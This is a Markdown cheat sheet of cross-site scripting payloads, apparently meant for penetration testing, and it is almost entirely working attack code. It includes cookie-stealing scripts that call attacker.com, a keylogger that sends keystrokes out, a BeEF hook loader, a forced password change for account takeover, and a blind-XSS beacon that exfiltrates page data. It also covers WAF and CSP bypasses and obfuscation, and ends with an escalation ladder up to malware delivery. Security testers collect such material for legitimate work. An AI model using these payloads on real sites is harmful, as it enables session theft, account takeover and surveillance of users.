# XSS Payloads

> Use only on authorized targets. Always confirm with minimal PoC before using heavy payloads.
> Detection goal: prove execution. Use `alert(1)` or `console.log` first, escalate only if needed.

---

## Quick PoC (Start Here)

```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"'><script>alert(1)</script>
javascript:alert(1)
```

---

## Reflected XSS

### Basic
```
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
</tag><script>alert(1)</script>
```

### Inside HTML Attributes
```
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
' onmouseover='alert(1)
"><img src=x onerror=alert(1)>
```

### Inside JavaScript Context
```
'-alert(1)-'
\'-alert(1)//
</script><script>alert(1)</script>
";alert(1);//
```

### Inside URL/href
```
javascript:alert(1)
javascript:alert(document.cookie)
JaVaScRiPt:alert(1)
&#106;avascript:alert(1)
```

---

## Stored XSS

### Session Stealing
```html
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie)
</script>

<img src=x onerror="new Image().src='https://attacker.com/steal?c='+document.cookie">

<script>
  document.location='https://attacker.com/steal?c='+document.cookie
</script>
```

### Keylogger
```html
<script>
  document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/log?k=' + e.key);
  });
</script>
```

### BeEF Hook (if BeEF is running)
```html
<script src="http://attacker.com:3000/hook.js"></script>
```

### Account Takeover via Password Change
```html
<script>
  fetch('/api/user/password', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({password: 'hacked123'}),
    credentials: 'include'
  });
</script>
```

---

## DOM-Based XSS

### Common Sinks
```
document.write()
innerHTML
outerHTML
eval()
setTimeout()
setInterval()
location.href
document.domain
```

### Payloads for DOM Sinks
```javascript
# For innerHTML sinks
<img src=x onerror=alert(1)>
<svg><g/onload=alert(1)>

# For eval() / setTimeout() sinks  
alert(1)
};alert(1)//

# For location.href sinks
javascript:alert(1)

# For document.write() sinks
<script>alert(1)</script>
```

### Hash-Based DOM XSS
```
https://target.com/page#<img src=x onerror=alert(1)>
https://target.com/page#javascript:alert(1)
```

---

## Blind XSS

Use when output is rendered to an admin panel, log viewer, PDF generator, or support ticket system you can't directly see.

### Callbacks to detect blind execution
```html
<!-- XSS Hunter style — generates unique callback per payload -->
<script src="https://your-xss-hunter.com/j.js"></script>

<!-- DIY blind XSS beacon -->
<script>
  var d = document;
  fetch('https://attacker.com/blind?' + btoa(JSON.stringify({
    url: d.location.href,
    cookie: d.cookie,
    title: d.title,
    ua: navigator.userAgent
  })));
</script>

<!-- Image beacon (stealthier) -->
<img src=x onerror="this.src='https://attacker.com/blind?'+document.cookie">
```

---

## Polyglots (Work in Multiple Contexts)

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

"'`><svg onload=alert(1)>

-->'"</style></script><script>alert(1)</script>

%3Cscript%3Ealert(1)%3C/script%3E

<datalist><option value="</option></datalist><svg onload=alert(1)>
```

---

## WAF Bypass Techniques

### Case Variation
```
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<Script>alert(1)</Script>
```

### Whitespace / Newlines
```
<script
>alert(1)</script>
<svg
onload
=
alert(1)>
```

### HTML Encoding
```
&lt;script&gt;alert(1)&lt;/script&gt;
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=\u0061lert(1)>
```

### URL Encoding
```
%3Cscript%3Ealert(1)%3C/script%3E
%3Csvg%20onload%3Dalert(1)%3E
```

### Double Encoding
```
%253Cscript%253Ealert(1)%253C/script%253E
```

### Null bytes
```
<scr\x00ipt>alert(1)</scr\x00ipt>
<scr\x00ipt>alert(1)</script>
```

### Obfuscation
```javascript
// eval(atob()) — base64 encoded payload
<script>eval(atob('YWxlcnQoMSk='))</script>

// String.fromCharCode
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>

// setTimeout with string
<script>setTimeout('ale'+'rt(1)')</script>

// split/join
<script>['ale','rt(1)'].join('').replace('ale','ale')</script>
```

### Tag alternatives when `<script>` is filtered
```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

### Event handler alternatives
```
onerror onload onmouseover onfocus onblur onchange
onsubmit onreset onselect onkeydown onkeyup onkeypress
onclick ondblclick onmousedown onmouseup onmousemove
```

---

## Context-Specific Payloads

### Inside JSON Response (reflected in JS)
```
{"name":"</script><script>alert(1)</script>"}
{"name":"\u003cscript\u003ealert(1)\u003c/script\u003e"}
```

### Inside CSS
```
</style><script>alert(1)</script>
<style>@import 'javascript:alert(1)'</style>
```

### SVG-Specific
```
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">
```

---

## CSP Bypass Techniques

### Script Gadgets (when `unsafe-inline` is disabled)
If Angular is loaded: `{{constructor.constructor('alert(1)')()}}`
If JSONP endpoint exists: `<script src="https://trusted.cdn.com/jsonp?callback=alert(1)"></script>`

### data: URIs
```
<object data="data:text/html,<script>alert(1)</script>">
<iframe src="data:text/html,<script>alert(1)</script>">
```

### base-uri bypass
```
<base href="https://attacker.com/">
<!-- subsequent relative imports now come from attacker.com -->
```

---

## Impact Escalation Ladder

1. `alert(1)` — prove execution
2. `alert(document.domain)` — prove correct domain
3. `alert(document.cookie)` — prove cookie access
4. Cookie exfiltration to callback server — prove real impact
5. CSRF via XSS — perform state-changing actions as victim
6. Account takeover — full ATO via password/email change
7. Malware delivery — redirect to exploit kit or download
